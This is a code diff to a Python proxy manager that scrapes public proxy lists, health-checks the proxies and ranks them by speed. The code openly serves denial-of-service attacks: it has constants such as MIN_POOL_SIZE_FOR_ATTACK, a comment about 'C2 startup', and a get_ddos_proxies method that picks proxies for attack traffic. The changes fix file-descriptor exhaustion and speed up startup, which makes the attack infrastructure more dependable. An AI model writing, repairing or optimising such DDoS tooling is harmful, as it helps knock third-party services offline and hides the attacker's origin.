@@ -28,12 +28,12 @@ BACKUP_SOURCE_ON_EMPTY = True
 MIN_POOL_SIZE_FOR_ATTACK = 50
 EMERGENCY_REFRESH_THRESHOLD = 20
 MAX_ATTACK_DURATION = 43200
-HEALTH_CHECK_BATCH_SIZE = 250
-HEALTH_CHECK_TIMEOUT = 6
+HEALTH_CHECK_BATCH_SIZE = 50  # REDUCED from 250
+HEALTH_CHECK_TIMEOUT = 4        # REDUCED from 6
 
 # ========== PROXY SOURCE DEFINITION ==========
 class ProxySource:
-    def __init__(self, name: str, url: str, interval: int, 
+    def __init__(self, name: str, url: str, interval: int,
                  format: str = "text", parser: str = "default",
                  protocol: str = "http", priority: int = 5):
         self.name = name
@@ -269,12 +269,38 @@ class ProxyManager:
         self._cache_lock = asyncio.Lock()
         self._total_refreshed = 0
         self._total_dead = 0
+        # FIX: Shared session to prevent "Too many open files"
+        self._shared_session: Optional[aiohttp.ClientSession] = None
+        self._fetch_sem = asyncio.Semaphore(5)
+        self._health_sem = asyncio.Semaphore(30)
+
+    # FIX: Shared aiohttp session with connection limits
+    async def _get_session(self) -> aiohttp.ClientSession:
+        if self._shared_session is None or self._shared_session.closed:
+            connector = aiohttp.TCPConnector(
+                limit=50,
+                limit_per_host=5,
+                ttl_dns_cache=300,
+                use_dns_cache=True,
+            )
+            self._shared_session = aiohttp.ClientSession(
+                connector=connector,
+                trust_env=False,  # FIX: Prevent system proxy conflicts
+                timeout=aiohttp.ClientTimeout(total=30),
+            )
+        return self._shared_session
+
+    async def _close_session(self):
+        if self._shared_session and not self._shared_session.closed:
+            await self._shared_session.close()
+            self._shared_session = None
 
     # ==================== FETCH & PARSE ====================
     async def _fetch_source(self, source: ProxySource) -> List[ProxyData]:
         proxies = []
-        try:
-            async with aiohttp.ClientSession() as session:
+        async with self._fetch_sem:
+            try:
+                session = await self._get_session()
                 async with session.get(source.url, timeout=settings.PROXY_SCRAP_TIMEOUT) as resp:
                     if resp.status != 200:
                         logger.warning(f"[FETCH] {source.name}: HTTP {resp.status}")
@@ -282,37 +308,41 @@ class ProxyManager:
                         return []
                     content = await resp.text()
 
-            raw_proxies = []
-            if source.format == "json":
-                raw_proxies = self._parse_json(content, source.parser)
-            elif source.format == "html":
-                raw_proxies = self._parse_html(content, source.parser)
-            else:
-                raw_proxies = self._parse_text(content)
+                raw_proxies = []
+                if source.format == "json":
+                    raw_proxies = self._parse_json(content, source.parser)
+                elif source.format == "html":
+                    raw_proxies = self._parse_html(content, source.parser)
+                else:
+                    raw_proxies = self._parse_text(content)
 
-            for ip, port in raw_proxies:
-                if self._is_valid_ip(ip) and 1 <= port <= 65535:
-                    proxies.append(ProxyData(
-                        ip=ip, port=port,
-                        protocol=source.protocol,
-                        source=source.name,
-                        priority=source.priority,
-                        last_check=0.0,
-                        is_alive=True,
-                    ))
+                # FIX: Limit max proxies per source
+                MAX_PROXIES_PER_SOURCE = 500
+                for ip, port in raw_proxies[:MAX_PROXIES_PER_SOURCE]:
+                    if self._is_valid_ip(ip) and 1 <= port <= 65535:
+                        proxies.append(ProxyData(
+                            ip=ip, port=port,
+                            protocol=source.protocol,
+                            source=source.name,
+                            priority=source.priority,
+                            last_check=0.0,
+                            is_alive=True,
+                        ))
+                if len(raw_proxies) > MAX_PROXIES_PER_SOURCE:
+                    logger.warning(f"[FETCH] {source.name}: Truncated from {len(raw_proxies)} to {MAX_PROXIES_PER_SOURCE}")
 
-            source.fail_count = 0
-            logger.info(f"[FETCH] {source.name}: {len(proxies)} scraped")
-            return proxies
+                source.fail_count = 0
+                logger.info(f"[FETCH] {source.name}: {len(proxies)} scraped")
+                return proxies
 
-        except asyncio.TimeoutError:
-            source.fail_count += 1
-            logger.warning(f"[FETCH] {source.name}: Timeout")
-            return []
-        except Exception as e:
-            source.fail_count += 1
-            logger.error(f"[FETCH] {source.name}: {e}")
-            return []
+            except asyncio.TimeoutError:
+                source.fail_count += 1
+                logger.warning(f"[FETCH] {source.name}: Timeout")
+                return []
+            except Exception as e:
+                source.fail_count += 1
+                logger.error(f"[FETCH] {source.name}: {e}")
+                return []
 
     def _parse_text(self, content: str) -> List[Tuple[str, int]]:
         proxies = []
@@ -380,8 +410,9 @@ class ProxyManager:
         proxy_url = f"http://{proxy.ip}:{proxy.port}"
         start_time = time.time()
 
-        try:
-            async with aiohttp.ClientSession() as session:
+        async with self._health_sem:
+            try:
+                session = await self._get_session()
                 async with session.get(
                     url,
                     proxy=proxy_url,
@@ -413,31 +444,25 @@ class ProxyManager:
                         proxy.last_check = time.time()
                         return proxy, False, elapsed
 
-        except asyncio.TimeoutError:
-            proxy.fail_count += 1
-            proxy.fail_streak += 1
-            proxy.last_check = time.time()
-            proxy.response_time = HEALTH_CHECK_TIMEOUT
-            return proxy, False, HEALTH_CHECK_TIMEOUT
-        except Exception:
-            proxy.fail_count += 1
-            proxy.fail_streak += 1
-            proxy.last_check = time.time()
-            proxy.response_time = HEALTH_CHECK_TIMEOUT
-            return proxy, False, HEALTH_CHECK_TIMEOUT
+            except asyncio.TimeoutError:
+                proxy.fail_count += 1
+                proxy.fail_streak += 1
+                proxy.last_check = time.time()
+                proxy.response_time = HEALTH_CHECK_TIMEOUT
+                return proxy, False, HEALTH_CHECK_TIMEOUT
+            except Exception:
+                proxy.fail_count += 1
+                proxy.fail_streak += 1
+                proxy.last_check = time.time()
+                proxy.response_time = HEALTH_CHECK_TIMEOUT
+                return proxy, False, HEALTH_CHECK_TIMEOUT
 
     async def _mass_health_check(self, proxies: List[ProxyData], max_concurrent: int = None) -> List[ProxyData]:
         max_concurrent = max_concurrent or HEALTH_CHECK_BATCH_SIZE
-        semaphore = asyncio.Semaphore(max_concurrent)
-
-        async def check_with_semaphore(proxy):
-            async with semaphore:
-                return await self._check_single_proxy(proxy)
-
         logger.info(f"[HEALTH] Mass check: {len(proxies)} proxies, concurrent={max_concurrent}")
         start = time.time()
 
-        tasks = [check_with_semaphore(p) for p in proxies]
+        tasks = [self._check_single_proxy(p) for p in proxies]
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
         elapsed = time.time() - start
@@ -465,10 +490,9 @@ class ProxyManager:
         if not proxies:
             return
 
-        # FIX: Skip health check on initial load to prevent blocking C2 startup
         if skip_health_check:
             logger.info(f"[REFRESH] {source.name}: Storing {len(proxies)} proxies without health check (initial load)")
-            alive_proxies = proxies  # Treat all as alive initially, check later
+            alive_proxies = proxies
         else:
             alive_proxies = await self._mass_health_check(proxies)
             if not alive_proxies:
@@ -556,7 +580,8 @@ class ProxyManager:
     async def start_background_refresh(self):
         self._running = True
 
-        await self.refresh_all(force=True)
+        # FIX: Skip health check on initial load for fast startup
+        await self.refresh_all(force=True, skip_health_check=True)
 
         for src in self.sources:
             task = asyncio.create_task(self._schedule_source(src))
@@ -619,10 +644,11 @@ class ProxyManager:
         for task in self._refresh_tasks:
             task.cancel()
         await asyncio.gather(*self._refresh_tasks, return_exceptions=True)
+        await self._close_session()
         logger.info("[BG] All background tasks stopped")
 
     # ==================== DDoS PROXY SELECTION ====================
-    async def get_ddos_proxies(self, count: int = 500, min_tier: str = "medium", 
+    async def get_ddos_proxies(self, count: int = 500, min_tier: str = "medium",
                                 protocols: List[str] = None) -> List[str]:
         redis = await get_redis()
         tier_order = {"ultra_fast": 0, "fast": 1, "medium": 2, "slow": 3, "dead": 4}
